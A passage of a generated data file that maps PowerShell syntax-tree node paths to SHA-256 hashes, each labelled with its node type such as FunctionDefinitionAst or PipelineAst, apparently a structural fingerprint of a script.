    "0.1.5": "62826ae87e490fc590ef84759cd3d3820f6f00f5ce012f4921570bd5fe55d955",  # FunctionDefinitionAst
    "0.1.5.1.0.0": "a2ed18f8a643844d6aceac02d277cb0d47b3ff3fc22a384ec3e63a875eb9e415",  # PipelineAst
    "0.1.6": "08432a3600a9ba805b6b6dd54d6160965c78186a6b805fe4ed2da28a4c011690",  # FunctionDefinitionAst
    "0.1.6.1.0.0": "90a5dd98184ffdbef56802fcea2097fe5770088b2ac66a7dc864d5bda9f79562",  # IfStatementAst
    "0.1.6.1.0.0.1.0": "d972ffe5b9aad9f5bcdc9d6564aa183f89e02fd489dbae33df513a02b54e90d7",  # ThrowStatementAst
    "0.1.6.1.0.1": "0615b4d31506c7324b07618c9f850569865ee1a4010008795b93a89e7bb8875f",  # AssignmentStatementAst
    "0.1.6.1.0.2": "d020e12c29f6b4860cdec38a3b3ef5dbf5d4d16790e654d834dbfb7dca235b4c",  # AssignmentStatementAst
    "0.1.6.1.0.3": "318c733624a0df0b6b0de188b635b91ea1d25e7b5effde15d9f65be773ec4a92",  # AssignmentStatementAst
    "0.1.6.1.0.4": "57484ffe75305186e26651f8e56cee3ebdfe36e61442af46391fbc397c1dce2a",  # IfStatementAst
    "0.1.6.1.0.4.1.0": "631133340637d8eb761c9ea72b702891d79732b7b448605ac49c89a122cf2d8d",  # ThrowStatementAst
    "0.1.6.1.0.5": "d1cb3e32a035508bf18834133b5fe0928b1478fbe4393e11e17e82636da55766",  # ForStatementAst
    "0.1.6.1.0.5.3.0": "7ea1d1a6deb81b4300251317fcab629f53e2d1071c37faa920031dec087c803d",  # IfStatementAst
    "0.1.6.1.0.5.3.0.1.0": "6dc469ed595c7b763b29c001c4bdc28eb2bb5cda261a3526ccaaada669232cd1",  # IfStatementAst
    "0.1.6.1.0.5.3.0.1.0.1.0": "9c8440efad9fffbd7f0ff26a6b6766ed9bc84081cb669562a3ee6ac0f6b9db71",  # ThrowStatementAst
    "0.1.7": "6b00776c9a686fa762198587b7d245a7e9fed865128f9126262dd4fd2c72dbe5",  # FunctionDefinitionAst
    "0.1.7.2.0.0": "97a04348744be26733a627188ae52edef157b2e06580b240cf3feaa767f6a00c",  # AssignmentStatementAst
    "0.1.7.2.0.1": "41dcc8ab9ad4868d6a9d1c0453d2d93d9a4a6b68647b8c4ae58e1d6aa19975a6",  # AssignmentStatementAst
    "0.1.7.2.0.2": "02954e0bca17870a8e74988fba6646d8f712586308a1472e56b8d8a1cbf2bbde",  # PipelineAst
    "0.1.7.2.0.3": "47148f969d961eaf0f6b79245addab7c188d5f5125b3528c02511811501e9b3d",  # PipelineAst
    "0.1.7.2.0.4": "1b4203e4aff6c162e9bd36acad28787713479304d2904f3efa95de9cd85b3dc3",  # IfStatementAst
    "0.1.7.2.0.4.1.0": "ce358243798539cb5f7aa07d95ce1c79428b23a483a8ccc9aa5112c9c4e83fe4",  # PipelineAst
    "0.1.7.2.0.5": "f615d45ef9c7dd0bb437ea5173855d9d84e49de291952749750bab1f0e5ccbda",  # PipelineAst
    "0.1.8": "ce5aa1dfdb23870055d2814db2155c04f93632ef0028937877711d2bb3baa729",  # FunctionDefinitionAst
    "0.1.8.2.0.0": "fc71b5af28777d178618ee263fa5156e51f4270a9fdacf7c8010f4bb545f3828",  # AssignmentStatementAst
    "0.1.8.2.0.1": "169cff3a401347fc341c6a42eeb4cde5022fd35599104cc07af4fdea12969a9b",  # AssignmentStatementAst
    "0.1.8.2.0.2": "c60c567764a0b9116afd7d6e04d18d60b4dcdc21fae5c9916a302875b9473ef7",  # AssignmentStatementAst
    "0.1.8.2.0.3": "834b298080412b970c74d6a72b3e051beda6b9df686032df89fa48969dadae36",  # AssignmentStatementAst
    "0.1.8.2.0.4": "2e8116710085bc22859e8f0bf27fdc3db5bc70e5ab45ebce5086f0f866466589",  # ForStatementAst
    "0.1.8.2.0.4.3.0": "45615db41c86aa10c275e21781c5b415ec7a4614d6a246a73e247741781790ac",  # TryStatementAst
    "0.1.8.2.0.4.3.0.0.0": "31dacefef3dbc424de140d3e90d41c2df2a766549ad69919edd045637bc0ed7f",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.0.1.0.0": "81837ce1e11f136741a3150c9c21ef65a964ea465c652d9a8bb4d3c48e829ba9",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.0.1.0.0.1.0.1.0.0": "b7197322733a16681eb5b32909b4853f52d1e5281ba1304f5e6142f93fd57385",  # PipelineAst
    "0.1.8.2.0.4.3.0.1.0.1": "7ce8dc526092df661850dfa6624a0df219ef0bff9c323050c75eac8bf4a42150",  # BreakStatementAst
    "0.1.8.2.0.4.3.1": "3b1b8a14dbf03bde2710ebe4f5abf3e72c1d32ca461279e500fee2b3038ab576",  # IfStatementAst
    "0.1.8.2.0.4.3.1.1.0": "eb847b6142f77af63b0166492f4461e3f4b34e771d4069f3b54762a8cbf7f977",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.1.1.1": "8fab3e170126e068933c123edcb15b421878fa668cc08be0f3046a62a97d4144",  # BreakStatementAst
    "0.1.8.2.0.4.3.2": "2c9663f9cf71fbd33b5fad1074688d746ecbb8bf5019d2f0fba8229126e5e782",  # IfStatementAst
    "0.1.8.2.0.4.3.2.1.0": "f6dc5f8c9b8b2d3bcdf3dc8f2e55f03f88f21d368c3011466016b0f84b95a2d2",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.2.1.0.1.0.1.0.0": "d391abb4ef4612e6e01452ce0957a1440a7dd9c80577712584d77e681e411dc6",  # PipelineAst
    "0.1.8.2.0.4.3.2.1.1": "46f5f6944d88eead3d2ed1c48dc3a7307ca532c276af1d69ce99605d5fa44669",  # BreakStatementAst
    "0.1.8.2.0.4.3.3": "a6d937a27bfa776c9d79c6d9d753f7303cc531899807c4c66fbdf385c90de160",  # ForEachStatementAst
    "0.1.8.2.0.4.3.3.1.0.0.0.0": "91b8fd7d9f1cf7a1c08b31f52cae83436db3d1d10b065cc267e031b5b0fd6819",  # PipelineAst
    "0.1.8.2.0.4.3.3.2.0": "65e1276217171d5b91bd0deecd38461267abc912f651e3221de728daea75d989",  # PipelineAst
    "0.1.8.2.0.4.3.4": "0e61f547e62193e1d314b6daaf7dadcfdce650f7890dba4b6142b766fcd3fad4",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.4.1.0.0.0.0": "814e8834ed720ae904f366bfd5a8ab11aa2854cb86314d961520c3c52815660c",  # PipelineAst
    "0.1.8.2.0.4.3.4.1.0.0.0.0.1.1.0.0.0": "8446d6b7e62913bf7c0fa32f344de85e2ec835eef961fa782d0e166366b43b9d",  # PipelineAst
    "0.1.8.2.0.4.3.5": "adf65de4b2fbe8777d689c0941247757e2cc0a8bd6995a929cf31faf5c756c4a",  # IfStatementAst
    "0.1.8.2.0.4.3.5.1.0": "a66ea2daa2f07628daea8d22c2967c0dc0e3ebb2813efc408c2ffb7ef815b1f3",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.5.1.1": "65b5c1e0162d457dbabac71f4811bdf4f9b26bb5d7c5631482fa577bfccae42a",  # BreakStatementAst
    "0.1.8.2.0.4.3.6": "007036d67d394b454374fdd65e70365cf9c3422b9c2398d4c7aac34c990f3d7c",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.6.1.0.1.0.0": "e5e465861ea8576035bd9152dc9b708a6b498985e072dd54d0dd7d74582d39d3",  # PipelineAst
    "0.1.8.2.0.4.3.7": "7a29e2320177d7fc02164a2f9468547078c909ae0df0a002a4fee39ad378b721",  # IfStatementAst
    "0.1.8.2.0.4.3.7.1.0": "c6732e1b11168423adfc233b862349dfb02b4dfbbad360d04a5bb3a5dc91ebdb",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.7.1.1": "d0551c47305b40afc74de3707308acfc81bd1c5270492b55229e14a7cddde715",  # AssignmentStatementAst
    "0.1.8.2.0.4.3.7.1.2": "3c5713db829527a7a75da39c3468751615a1e3435d0a5c3663f920b46894fdfd",  # BreakStatementAst
    "0.1.8.2.0.5": "f215fed03426a52b27588512a78dc41f5966688a9ed35cea95aaab67ede203a2",  # PipelineAst
    "0.1.9": "8d250faac3921bea27cc968f9d0df680dddf353ab0afaf4fab796366ecb2be7d",  # FunctionDefinitionAst
    "0.1.9.1.0.0": "7feb840ec2eb11375d2665f266ba6e575fdafda3c290f5e81bd84e60b18728e5",  # TryStatementAst
    "0.1.9.1.0.0.0.0": "8d493ddce837d12d49da0c41ac52346829f19a60526041ac363638d9c54afafa",  # AssignmentStatementAst
    "0.1.9.1.0.0.1.0.0": "ec4d77e08d7ab00b786b63e805a5df17758eef7b9ed17b99050eb90e8e5b40d3",  # ReturnStatementAst
    "0.1.9.1.0.0.1.0.0.0.0.0.5.0.0.0.0.0": "d5a054dad9860341c4b1e76a6cdb3cd998c6784663d119c202ab2b9f6940a893",  # PipelineAst
    "0.1.9.1.0.1": "0764338e31d493e98d59c63e84e0680dd0b73c382a1d4fb0d7437bf70e633511",  # IfStatementAst
    "0.1.9.1.0.1.1.0": "6b8816c7f4ede4ab5f2cd813c466d2030314eb98a7475c592085f493a063c4a6",  # ReturnStatementAst
    "0.1.9.1.0.1.1.0.0.0.0.5.0.0.0.0.0": "859b16f351414468c5cfef49a9abcc731901e4cd06c4a72511fa0712877356a0",  # PipelineAst
    "0.1.9.1.0.2": "ee2d7b59a4e736cb2e2406fd85c224180598b89e0b276723e3975d81203c75f4",  # PipelineAst
    "0.1.9.1.0.2.0.0.1.0.0.0.0": "2a0b4ec467daeb50ddf1bf2c09f8d3d1d16e884954d1d648fffb972d2b72a9e9",  # PipelineAst
    "0.1.10": "f18400dd4da66c683fa470ed37f4a483bab062397a016f0d4dbfb86b4a8b3fec",  # AssignmentStatementAst
    "0.1.10.1.0.0.0": "c1f0bdc8afb88f143664735a8d835dc2b248a36c9bbabecb4b78c1edf77b2e9d",  # PipelineAst
    "0.1.11": "59bd9c39d17da938b0fcc2a2cd84c827199f55b617d7bf1d89c57fc5cd7509b6",  # FunctionDefinitionAst
    "0.1.11.1.0.0": "cbe2fb6add5b908ba924247958ea6a17b35c688cb41c8fbd045cdccb1653de36",  # AssignmentStatementAst
    "0.1.11.1.0.1": "2f24236d7cc8f9cc80167b80beef967521c0cd40d9382cbe02e84e60eb336bfc",  # ForEachStatementAst
    "0.1.11.1.0.1.1.0.0.0.0": "040d1efaef8f536cd3ae4d98a6e9a3dac8cc525f93109d7eb126953da482a11a",  # PipelineAst
    "0.1.11.1.0.1.2.0": "79b537cc5d36be1ef436b5f2652f1df40c34657381b06ed0fab534f46c52d4b4",  # AssignmentStatementAst
    "0.1.11.1.0.1.2.1": "a8261bcbba81f980d06485c0a3df985448325a34c56c86e5eb649209df24f09e",  # AssignmentStatementAst
    "0.1.11.1.0.1.2.2": "0510f6e32fd3af3b5ffe0fb9e43521762e4eecb6b5c557c46595d1b7b00d34ea",  # IfStatementAst
    "0.1.11.1.0.1.2.2.1.0": "f6ebea7c63d6c418ae5c2ef5ff8b17f11e9e045f7baa28f79549fef59e80e0ac",  # AssignmentStatementAst
    "0.1.11.1.0.1.2.2.1.0.1.0.0.0": "db7e310d6a3ffa810fc01bf7a80a7642d98ff3acd98c3e4de302a0ead492a59f",  # PipelineAst
    "0.1.11.1.0.1.2.2.2.0": "1954a469a37cab6dcee00d029a132e7949f0fa0a02c4f31ca3c36d0b509f0227",  # AssignmentStatementAst
    "0.1.11.1.0.1.2.2.2.0.1.0.0.0": "105e3adcd7bad2f77d9a3af1ac86e905a1af3be7fe7a3011f72f71955831b00d",  # PipelineAst
    "0.1.11.1.0.2": "db4d8cc502ef222927d597154a52d42876996c5bd8821fcbe6f62b457909cab7",  # AssignmentStatementAst
    "0.1.11.1.0.2.1.0.0.0": "e31e1deb9d8430d569bd46c29a323bf293e6a86dc8057f23cf095bb9dafbd50c",  # PipelineAst
    "0.1.11.1.0.3": "309fa3ca13026da8fc110179e5d74b76da3e0e5ee497730c23742a2c8d12653a",  # PipelineAst
    "0.1.12": "3706885e7ebdcf39c7503a5ae897cf5a8e2d19a4438d6de2bab84791e9493d98",  # FunctionDefinitionAst
    "0.1.12.2.0.0": "661c82663d4a0e6ceb0170f3e634fe72e916692b06a2089824fb6b4de58e9827",  # IfStatementAst
    "0.1.12.2.0.0.1.0": "6f6b761f9201fed937e631dbf09b0ffed43737a3441fba407655a63c5a866aae",  # PipelineAst
    "0.1.13": "25c8795ed7f6a603c21fac7e9a8e7524a4e391d6268631c1417a544391b21484",  # FunctionDefinitionAst
    "0.1.13.0.0.0": "6a1c1e91f9e172d12a87e4be83e70e6956996a10dab44018b4adc8775c0b5c02",  # IfStatementAst
    "0.1.13.0.0.0.1.0": "a1fb86f9d9940e711ef98338ac301071c7c6ffb73bf23a2a78a2057e23f2ffad",  # ReturnStatementAst
    "0.1.13.0.0.1": "bf86772baf5ce88051790051c303745aeba917b23bf5cdf91c19a98b392b8871",  # PipelineAst
    "0.1.13.0.0.2": "553615070c7e5213fd2b8dfe4d85f38a60c3b86adfd0db51d044cb95d552d5ab",  # AssignmentStatementAst
    "0.1.13.0.0.3": "1f75830a8f773b146b74646146ae557636c1c1a11cc888a860d8b83b221b467e",  # IfStatementAst
    "0.1.13.0.0.3.1.0": "58950b3a4f02b9cb55b32e563beeb561271e5eeacddb6f943b5c02b046c2b848",  # AssignmentStatementAst
    "0.1.13.0.0.3.1.1": "ae90c9ea37fce6a76fcb6a02bb9af7e1cbcf30e492afbcff556d530d95bda765",  # AssignmentStatementAst
    "0.1.13.0.0.3.2.0": "182782f0f244ab41dda573df7726964f0e71211ef934370220de6a389a3eadb8",  # AssignmentStatementAst
    "0.1.13.0.0.4": "8b7a8d910530bb91b1a0b464e3a086c099c678d929a5ab2bb5f81fe0e79e6ee9",  # AssignmentStatementAst
    "0.1.13.0.0.5": "60c7160555e6484f8ed759a972e04c129ebf3d6bad83addc88065a6b6c518710",  # AssignmentStatementAst
    "0.1.13.0.0.6": "b7218fb7f9280c91d596b07f6455e191bc80ccda10e8250ce7d7d2cf6f17f85a",  # PipelineAst
    "0.1.13.0.0.7": "fa4b9e7c1b52df4ade75918c2454073449f1118e5c26f916759ca7c8859013be",  # AssignmentStatementAst
    "0.1.13.0.0.8": "977ecdbd7736ecfc01bf536f25bd2b50fbdc60c17eb5ffbf040051821e8a9901",  # PipelineAst
    "0.1.14": "b40668d991e106e0a4bc903462aa6c37eb8cf84ee4087ee3fdb23db949db8d95",  # FunctionDefinitionAst
    "0.1.14.5.0.0": "3593a39863b4dfbeb3fc788947c70970eb016339612b0f87f6df6036278dfdff",  # AssignmentStatementAst
    "0.1.14.5.0.1": "2eb7f5911835dc874ce97ffbcac18dfa6db64cc26f98393743a5ae558c9734ad",  # AssignmentStatementAst
    "0.1.14.5.0.1.1.0.0.0.1.0": "4049342d24f6a6203f8bb934435fcab68006822651807ae2d7035572f4024a3a",  # AssignmentStatementAst
    "0.1.14.5.0.1.1.0.0.0.1.1": "5d5b307de08d3808c32eb4196a526f66803624b2b564fe7dc85ad85ad4acc441",  # IfStatementAst
    "0.1.14.5.0.1.1.0.0.0.1.1.1.0": "047931e72866f303c43787c5123bb95742ec2164b244bf7b3a1f1cee13c7138f",  # AssignmentStatementAst
    "0.1.14.5.0.1.1.0.0.0.1.1.1.1": "fe8a5206cae9231ca44b47b8188550c864bc97bea2c80751bce85977f3e32635",  # IfStatementAst
    "0.1.14.5.0.1.1.0.0.0.1.1.1.1.1.0": "8bc6913a35c73ef4f06cc1e5a045c00f8974efe4ec880be028e82e80caaf7378",  # AssignmentStatementAst
    "0.1.14.5.0.1.1.0.0.0.1.1.1.2": "d97772f60c66da038875ac7e770175f785a967787d98b92b1ea524092eacc05b",  # PipelineAst
    "0.1.14.5.0.1.1.0.0.0.1.2": "5ec4dbd6ba401f6f4cffbc20f987c3c6024f4f5279e1301dbd943164777c8dbf",  # IfStatementAst
    "0.1.14.5.0.1.1.0.0.0.1.2.1.0": "6b643174a4a973ce6f7f9b2c3105d7f1a27db6d19b55d0ff6654f561a4953fe4",  # PipelineAst
    "0.1.14.5.0.1.1.0.0.0.1.3": "4affd12cdeed62b1db01d8cc1735a6b01b47d6925c7cd58f54dab44ae3a0b6e3",  # PipelineAst
    "0.1.14.5.0.2": "f3bf2848b92a6e675727144e3675c8e1376f25ad7c74b3d16992274e9234c9ae",  # IfStatementAst
    "0.1.14.5.0.2.1.0": "6e785111b57648072dcbe5c7d1c91bcfe11d1acff88c6caadcca1639e03680bc",  # ReturnStatementAst
    "0.1.14.5.0.3": "06358f99c012d95c45d80a54f7e96515cc2ec65d0148533f9b0f9c5b8f7ab4ab",  # PipelineAst
    "0.1.15": "cafcbb68259d43bb0ab2dab3285e8a9491716e5eb75f8af6b453834b7ed1021c",  # FunctionDefinitionAst
    "0.1.15.0.0.0": "7b27f11f87b5c50d40c972104e06ed0eb5f1ecc0c5445fa74f67f3700264aeb3",  # IfStatementAst
    "0.1.15.0.0.0.1.0": "60adba0d5510c7115effa47c90f1e33b6735836658c53ba5d28da1f4bbe60e6b",  # ReturnStatementAst
    "0.1.15.0.0.1": "5d86a1dee749f54c25981d160fa6ec333687aa7d4d3965dc634ca217b112f96c",  # AssignmentStatementAst
    "0.1.15.0.0.1.1.0.3.0.0": "da968763dfa5b58889aed516597e907c4223d7514b870972e807bcc292245d7c",  # PipelineAst
    "0.1.15.0.0.2": "b338d0d7bd9b6698ac34911a485f7febf1b8d968b59a5f95247bb1dab0573d96",  # IfStatementAst
    "0.1.15.0.0.2.1.0": "6396591f8d0c4835cf85bcacc233af224568efae70017b4db2252f0657f8d96f",  # ThrowStatementAst
    "0.1.15.0.0.2.1.0.0.0.0.0.0.0": "5fdac8a57b6f16eb2726a47be67dae78843aa297e0fc34724d90723e69bf5a64",  # PipelineAst
    "0.1.15.0.0.3": "70dfd82b4b979f723882b110d07504595c31a3c79919ae0b354f06e0fda5bf12",  # AssignmentStatementAst
    "0.1.15.0.0.4": "d0d724faa47c731d914014b2e64c01debfd8960cb872059e344bb88f745b351e",  # AssignmentStatementAst
    "0.1.15.0.0.4.1.0.1.0.0.1.0.0.0": "cd8a7429041b0762d5f5b1fc927f22b749a38ce7def320986de1630977b8af94",  # PipelineAst
    "0.1.15.0.0.4.1.0.3.0.0.1.0.0.0": "f0c0aa33799b8688f1fb1eb17b4e5b46fe87c6b11bf36e66e9af6ca78258da2f",  # PipelineAst
    "0.1.15.0.0.5": "2bc4534a8947bba365b659d0ef61d5161768645ca1b31f872ebe8cca1eee13f7",  # PipelineAst
    "0.1.16": "43a766259c3f75a12c742a4b10dc44d65737dcd98563835aa7ca2732e43fb73c",  # FunctionDefinitionAst
    "0.1.16.1.0.0": "f1a971ea29348df5c59ed2efa6a114a8c39bea1b585e2124f5dc82f649270276",  # IfStatementAst
    "0.1.16.1.0.0.1.0": "3db759c5092c0533a5fd56ae4f83f6abe5350819ee98d5bbe6a0b2a32d0f45cd",  # ReturnStatementAst
    "0.1.16.1.0.1": "82c56b44d0878cd6aa06f5e6a18f5430378c93f473de3dce7919105a6484fee8",  # PipelineAst
    "0.1.16.1.0.1.0.0.0.0.0": "7e7b5043c09c7b6fd7a3b4e826b48c680f743de036228b783c2baa13333ffb51",  # PipelineAst
    "0.1.17": "c3ded6d5b874c11c54225cf8f88caf3aa1e5e72984084ad624e2d9d32bf9949d",  # AssignmentStatementAst
    "0.1.18": "eb9e0a2da61d84c9ef377c2576ad04aad2359ce74beee05124ba5bba5697b2db",  # AssignmentStatementAst
    "0.1.19": "30d521af01286efc22d1041b79f5d1808d2d47d55ae39c28f045b8ddb56eaf04",  # AssignmentStatementAst
    "0.1.20": "27ab5146b9508f52bc2f0db49679dfc0842fb868dbab4d9fe1564a998d49af76",  # FunctionDefinitionAst
    "0.1.20.2.0.0": "5a6380202593cb735b9533a333548c3d8cbec534b9fb9f9e58721e7259095988",  # IfStatementAst
    "0.1.20.2.0.0.1.0": "e3e0af6caf68017500833daa638a6ffa279b54514e7df2997d2887a6b4bfd701",  # ThrowStatementAst
    "0.1.20.2.0.1": "e73580839a935fd1aa5b9698db1be38336302d8669ab03e0d3744548c3e12713",  # AssignmentStatementAst
    "0.1.20.2.0.2": "605c0e1eedc5200affefb88a7502540d292a08f751bdf705514b3ffb4794e3b4",  # ForEachStatementAst
    "0.1.20.2.0.2.2.0": "f3bb69422390658b38cf17a74c88cc2b1f9aa7c2cbd52449094dc2f472f9fe9c",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.1": "981e5e1272283d38cb8aaa9b99d4bc82c2bbdddfc1cb9ff4aacf02854ebe8763",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.2": "2725fe018e4847a98180a7bb0aff231b4bd93ee6b537d6aab7fa7f38e36f37de",  # IfStatementAst
    "0.1.20.2.0.2.2.2.1.0": "73a5be69994300d3353a201194179efbe2d56ce7048cddf1ef9d37af0a14e49a",  # ContinueStatementAst
    "0.1.20.2.0.2.2.3": "17642d7a4fb0592351a02db84b4f72ae66c1d186f2753ea98bf622851a1c5088",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.3.1.0.0.0": "2782aec6358868ed2506ce1ddd16191ba4ac3b1ab0c7b6a55e9ca1b9309a0168",  # PipelineAst
    "0.1.20.2.0.2.2.4": "885f867e19fa1c9862932b74d77b95d1a61a5c0a94c94e4e01b43b04b664ded3",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5": "e60a6a6d98e720f4258e42a933ee022c20f1719700536df83e8b8557e2a2e821",  # IfStatementAst
    "0.1.20.2.0.2.2.5.1.0": "527a96c241172c1bcd810f6bc796bd28cb8add83b5e52530485739bb49bc01be",  # IfStatementAst
    "0.1.20.2.0.2.2.5.1.0.1.0": "18cba22dc62844a130381cd523776dbde397bc50ab1930ab0910cfa0ffa028c3",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5.1.0.3.0": "47484c24038054c4750b8d905b73dd255bc51201feb492c9467556d3c116d4ea",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5.2.0": "d8a067db330de394bb74fa2458e103a3c6fec9e133ef3d926f9dfc17c95e3acb",  # SwitchStatementAst
    "0.1.20.2.0.2.2.5.2.0.2.0": "e1d6b4771d49aecaa64be000dade35d895d88789230b5c0cce9bea0cb5d7d73a",  # IfStatementAst
    "0.1.20.2.0.2.2.5.2.0.2.0.1.0": "1628fc6c0c778c753153c57aa8f3fce5966fe09caac354af68625bd00646c514",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5.2.0.4.0": "27775643eca95c7c421c04d557a023759987ecc8652aaae2950562161deff2d8",  # ForEachStatementAst
    "0.1.20.2.0.2.2.5.2.0.4.0.2.0": "842207dcab14385332471d977ed594d8bcbd6f4b40a36e02c354cafa7f50ffb0",  # IfStatementAst
    "0.1.20.2.0.2.2.5.2.0.4.0.2.0.1.0": "ce6b08d9670d9881c2a292c73a7f3b358c3cf019fafc53e216d4ea657c20ae7a",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5.2.0.6.0": "c0cdf52498ecf76126a03ba176c1915531631ad9ce9a5791502f01cd5d8acd77",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5.2.0.6.1": "f95347568d2ae764da43c04cec7ea8708b28d8c89e164aa3c10112d41670ea58",  # IfStatementAst
    "0.1.20.2.0.2.2.5.2.0.6.1.1.0": "3588e529e352fd30c262b86e37ea4deb353cf4d20c177b3a2239da825b573bae",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5.2.0.8.0": "9680a318798b4fc41bdc93afd63dc4ee11774e026f25da3773a0fdd7603d7e95",  # IfStatementAst
    "0.1.20.2.0.2.2.5.2.0.8.0.1.0": "77d7132e29faae1c16092b27931e2feb63e30879f534c9ba3ba58fb70a8a0da9",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.5.2.0.10.0": "0e7e2a7ef3a98d9f6e214e7878a079c9a427c0ee713aeb20716f5ec6ddf5ea14",  # ForEachStatementAst
    "0.1.20.2.0.2.2.5.2.0.10.0.2.0": "9df7d75e6ff5b745e1c995dbf9a1ce165410bc8fb0d0df428a4192ec57d5d5f9",  # IfStatementAst
    "0.1.20.2.0.2.2.5.2.0.10.0.2.0.1.0": "1983ebe03a5a948c429dc2bcaf5f1ccc0cf55f7a93f3caba0c25c6a7e765edaa",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.6": "dda0e6e2ceab8eae2fcc13aba201440783abead04acf216bcde92587eacf5da9",  # IfStatementAst
    "0.1.20.2.0.2.2.6.1.0": "da4cc9becdcabe68e4c4b5512969cf0dcb7c0b19ec897e9daf064f709c10213e",  # IfStatementAst
    "0.1.20.2.0.2.2.6.1.0.1.0": "0eb088ff40f4671b517a8f445a358243913ccf18e81e035b67178874123f6f23",  # AssignmentStatementAst
    "0.1.20.2.0.2.2.6.1.0.2.0": "3403658fe5874eb8485afbe58059174c6ddf0f0ea8914b11a064a74eb86dfc13",  # ReturnStatementAst
    "0.1.20.2.0.3": "1aca7af2d7e38f48f6ac3618733d9b0e979560970f1e1d46752f0ae55d8743f7",  # PipelineAst
    "0.1.21": "e6dac998589b9243a43634f82ca7545d25c951fe17134b99c44b0dbcd51b312d",  # FunctionDefinitionAst
    "0.1.21.2.0.0": "d45f423f2379f063b9585e61dc6ee93ce5dc8270ef6fa75e554c6d1098cc2b49",  # AssignmentStatementAst
    "0.1.21.2.0.1": "745efaa198040d31c855c950397dd5af03cf75977a88f6c81cbaa387c91e6e08",  # IfStatementAst
    "0.1.21.2.0.1.1.0": "77686c3167bd8c85585904a51b8418b470c25ae69728ac5af1bb04f7cfc573cf",  # ThrowStatementAst
    "0.1.21.2.0.1.1.0.0.0.0.1.0.0": "319d66c56b3d21e9c0779a1ea5c48f84e8fb1409e6ea2dea2f6dda1c0f19d153",  # PipelineAst
    "0.1.21.2.0.1.1.0.0.0.0.1.0.0.0.0.1.0.0.0": "392ae453ad3fc5e5bbe7714964eaa495965e42489c4ed3497ca90ac31a79183b",  # PipelineAst
    "0.1.21.2.0.1.1.0.0.0.0.2.0.0": "c43fb70d7f13e663924e798ee568b35b571ae32f4b6568c6d7ac36de64290c4f",  # PipelineAst
    "0.1.21.2.0.2": "be26c39d80233ee641635ce04ae8ee2b682e0236b655f0b2a6b77acbd64adc48",  # PipelineAst
    "0.1.22": "042052fb4e0f5708f329a47b97d6abf583c667c2cfcb6f0cd7a389efc054ef38",  # FunctionDefinitionAst
    "0.1.22.6.0.0": "2ba906c78d91da068ea50490a27622b0089cbe043a6c060690f011f792639569",  # AssignmentStatementAst
    "0.1.22.6.0.0.1.0.0.0": "363971274e6ec587d7f31b35f9f3544ba738827a574789d15d59ef302600e205",  # PipelineAst
    "0.1.22.6.0.0.1.0.0.0.1.1.0.0.0": "d34b967ef0e46c1c1f3fcbdfdbf5f6859644d83562642489596db6858fd8116f",  # PipelineAst
    "0.1.22.6.0.1": "66f3fb4aaf15f2b4281b733215c3ce6e9d8d1278d74c0aca181d5163421ed2a9",  # AssignmentStatementAst
    "0.1.22.6.0.2": "7bf7940439778b56181abddcf0a60b986702923e9fbfd6e01a28d1cc634a717c",  # AssignmentStatementAst
    "0.1.22.6.0.2.1.0.1.3.0.0.0.0": "2ab35ff08266cb4959eef020a7c0beda437fafeb3dfc6d5bca2061eb5143c418",  # IfStatementAst
    "0.1.22.6.0.2.1.0.1.3.0.0.0.0.1.0": "39b4d95fc856d4966e8de97bce7e767ce33da759773ec326b66c8354b8f1082c",  # PipelineAst
    "0.1.22.6.0.2.1.0.1.3.0.0.0.0.2.0": "01becd5c6f7cf1dcbc0ce7440e58dbf8dae4d73826bdc4edaa90bfc3dd25e2ae",  # PipelineAst
    "0.1.22.6.0.3": "037ba09d60fa885003d458c1b980572754e8a9616c86945611eadafe543ac8a1",  # IfStatementAst
    "0.1.22.6.0.3.1.0": "e508de70244f736f403aa94f378e26417da2be36fce8fe7b137efc97bdc1a396",  # AssignmentStatementAst
    "0.1.22.6.0.3.1.1": "5727b4282be94ca2491a92c5c788741dfe001d22954555005bd296ab1be92d2c",  # IfStatementAst
    "0.1.22.6.0.3.1.1.1.0": "fc038119e73bcbb8f9c852eeff81f2b6cffc64e1aad3466b40fb75dd4d55c32b",  # AssignmentStatementAst
    "0.1.22.6.0.3.1.2": "870af8b00f304eb1c388d0b93e1237e4438967edd76852bed8bdda155cfbf992",  # IfStatementAst
    "0.1.22.6.0.3.1.2.1.0": "32e65f3b339cf7b247a685e9149a9d6684588bd3523c74508c964aa97221b7d8",  # AssignmentStatementAst
    "0.1.22.6.0.3.1.2.1.1": "dcf5dc96c644111a2b3867b1d5bf99c55b7996979be1b3086f392e95a006011e",  # IfStatementAst
    "0.1.22.6.0.3.1.2.1.1.1.0": "ffa8fd30b059f08c6d9ed4e7f696f6840b123e6ed989355c5a3b0b70e98a1edf",  # AssignmentStatementAst
    "0.1.22.6.0.3.1.2.1.2": "a84e7b263ced917ebdc380f99ed00b08773e05fcba960eba2ab8db01fe22efa4",  # AssignmentStatementAst
    "0.1.22.6.0.3.1.3": "df0b0051b5691945082f6a4dd12ac4940318165c771f23ac1848f020de94c4c2",  # AssignmentStatementAst
    "0.1.22.6.0.4": "8feef4223820f1d2a572e3135708969d4b73d5db84adfd6e1710958ec1513edd",  # PipelineAst
    "0.1.23": "b2d3e0d1fb5fb4e5071ef0edcba48948b6e2b39e10191cfb1e8b306980922bc7",  # AssignmentStatementAst
    "0.1.24": "547230d1ca417662664eb10388223dd40547716bd19500b020633020af9cffb5",  # AssignmentStatementAst
    "0.1.25": "5c6b0fa02ffc35f1f45abba4c09a3044258dc770bd233c8ef7e45831f0799cac",  # FunctionDefinitionAst
